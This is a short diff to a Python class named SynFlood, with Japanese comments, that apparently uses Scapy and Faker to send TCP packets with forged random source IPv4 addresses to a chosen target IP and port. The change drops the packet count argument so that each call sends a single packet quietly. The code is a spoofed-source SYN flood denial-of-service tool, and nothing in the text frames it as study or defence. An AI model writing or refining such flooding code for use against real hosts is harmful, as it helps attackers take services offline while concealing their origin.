@@ -3,11 +3,10 @@ from faker import Faker
 
 class SynFlood:
     # コンストラクタ 宛先IPの
-    def __init__(self, dst_ip, dst_port, packet_count):
+    def __init__(self, dst_ip, dst_port):
         # 引数から宛先IPの受け取り
         self.dst_ip = dst_ip
         self.dst_port = int(dst_port)
-        self.packet_count = int(packet_count)
 
     # 偽IPv4アドレスを生成
     def createSrcIp(self):
@@ -29,4 +28,4 @@ class SynFlood:
     
     # パケット送信
     def sendPacket(self):
-        send(self.ip_packet/self.tcp_packet, count=self.packet_count)
+        send(self.ip_packet/self.tcp_packet, count=1, verbose=0)
